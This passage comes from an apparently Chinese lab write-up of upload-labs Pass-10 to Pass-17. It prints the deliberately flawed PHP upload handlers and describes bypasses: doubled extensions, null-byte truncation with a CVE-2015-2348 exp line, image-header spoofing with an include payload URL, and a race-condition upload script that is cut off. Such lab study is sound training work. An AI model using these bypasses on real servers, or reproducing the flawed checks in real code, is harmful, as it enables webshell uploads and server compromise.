&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。</p><p>该函数必须遵循下列规则：</p><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul><p>语法：<code>str_ireplace(find,replace,string,count)</code></p><p>注释：该函数是不区分大小写的。请使用 <a href="https://www.runoob.com/php/func-string-str-replace.html">str_replace()</a> 函数执行区分大小写的搜索</p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的值。</td></tr><tr><td align="left"><em>replace</em></td><td align="left">必需。规定替换 <em>find</em> 中的值的值。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>count</em></td><td align="left">可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p>这里漏洞的产生发生在第9行，<code>str_ireplace()</code>, 将匹配<code>$deny_ext</code>数组中的字符替换<code> </code>, 而这里只进行了一次替换，也及将这里<code>$file_name</code> 设置为<code>pphphp</code> 通过一次<code>str_ireplace()</code>的替换，<code>$file_name</code>的值将为等于<code>php</code>, 即可绕过</p><h3 id="2-利用-9"><a href="#2-利用-9" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103165931459.png" alt="image-20201103165931459"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103165958896.png" alt="image-20201103165958896"></p><p><code>phpinfo.pphphp</code> -&gt; <code>info.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103170431998.png" alt="image-20201103170431998"></p><p>Q：为什么会出现这种情况呢？</p><p>A：我们可以理解为<code>str_ireplace()</code>函数匹配是从头到尾，而且只匹配一遍，下面的代码也很好的说明了这一点</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103170855286.png" alt="image-20201103170855286"></p><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 %00截断"></a>Pass-11 %00截断</h2><h3 id="1-代码分析-1"><a href="#1-代码分析-1" class="headerlink" title="1. 代码分析"></a>1. 代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-11</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>substr()</code> 函数返回字符串的一部分。</p><p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0</p><p>语法：<code>substr(string,start,length)</code></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要返回其中一部分的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始。<br />正数 - 在字符串的指定位置开始<br />负数 - 在从字符串结尾的指定位置开始<br />0 - 在字符串中的第一个字符处开始</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td></tr><tr><td align="left">返回值：</td><td align="left">返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</td></tr></tbody></table><blockquote><p><code>strrpos()</code> 函数查找字符串在另一字符串中最后一次出现的位置</p><p><strong>注释：</strong><code>strrpos()</code> 函数对大小写敏感</p><p>语法：<code>strrpos(string,find,start)</code></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr><tr><td align="left">返回值：</td><td align="left">返回字符串在另一字符串中最后一次出现的位置，如果没有找到字符串则返回 FALS</td></tr></tbody></table><p><a href="http://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348</a>影响版本：<code>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</code>exp：<code>move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\x00.jpg&quot;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103172830640.png" alt="image-20201103172830640"></p><h3 id="2-利用-10"><a href="#2-利用-10" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103174634003.png" alt="image-20201103174634003"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103174737499.png" alt="image-20201103174737499"></p><h2 id="Pass-12-0x00绕过"><a href="#Pass-12-0x00绕过" class="headerlink" title="Pass-12 0x00绕过"></a>Pass-12 0x00绕过</h2><h3 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Pass-12</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195106747.png" alt="image-20201103195106747"></p><blockquote><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p></blockquote><p>原理同<strong>Pass-11</strong>，上传路径<code>0x00</code>绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php(二进制00)</code>形式</p><h3 id="2-利用-11"><a href="#2-利用-11" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195331575.png" alt="image-20201103195331575"></p><p>1对应31，我们将31改成<code>00</code>, </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195537359.png" alt="image-20201103195537359"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195630009.png" alt="image-20201103195630009"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195700377.png" alt="image-20201103195700377"></p><h2 id="Pass-13-文件头类型绕过"><a href="#Pass-13-文件头类型绕过" class="headerlink" title="Pass-13 文件头类型绕过"></a>Pass-13 文件头类型绕过</h2><h3 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过读文件的前2个字节判断文件类型，</p><h3 id="2-利用-12"><a href="#2-利用-12" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103201222006.png" alt="image-20201103201222006"></p><p>结合文件上传，构造<code>payload:http://172.16.9.177/include.php?file=upload/5920201103201712.gif</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103201328775.png" alt="image-20201103201328775"></p><h2 id="Pass-14-文件头类型绕过"><a href="#Pass-14-文件头类型绕过" class="headerlink" title="Pass-14 文件头类型绕过"></a>Pass-14 文件头类型绕过</h2><p>同理<code>Pass-13</code></p><h2 id="Pass-15-文件头类型绕过"><a href="#Pass-15-文件头类型绕过" class="headerlink" title="Pass-15 文件头类型绕过"></a>Pass-15 文件头类型绕过</h2><p>同理<code>Pass14</code></p><h2 id="Pass-16-图片马"><a href="#Pass-16-图片马" class="headerlink" title="Pass-16 图片马"></a>Pass-16 图片马</h2><h3 id="1-分析-10"><a href="#1-分析-10" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断了<code>后缀名</code>、<code>content-type</code>，以及利用<code>imagecreatefromgif</code>判断是否为gif图片，最后再做了一次二次渲染</p><h3 id="2-利用-13"><a href="#2-利用-13" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103202410138.png" alt="image-20201103202410138"></p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h2><h3 id="1-分析-11"><a href="#1-分析-11" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件</p><h3 id="2-利用-14"><a href="#2-利用-14" class="headerlink" title="2.利用"></a>2.利用</h3><p>利用条件竞争删除文件时间差绕过。使用命令<code>pip install hackhttp</code>安装<a href="https://github.com/BugScanTeam/hackhttp">hackhttp</a>模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">def upload(lists):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;</span><span class="string">&quot;POST /Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span 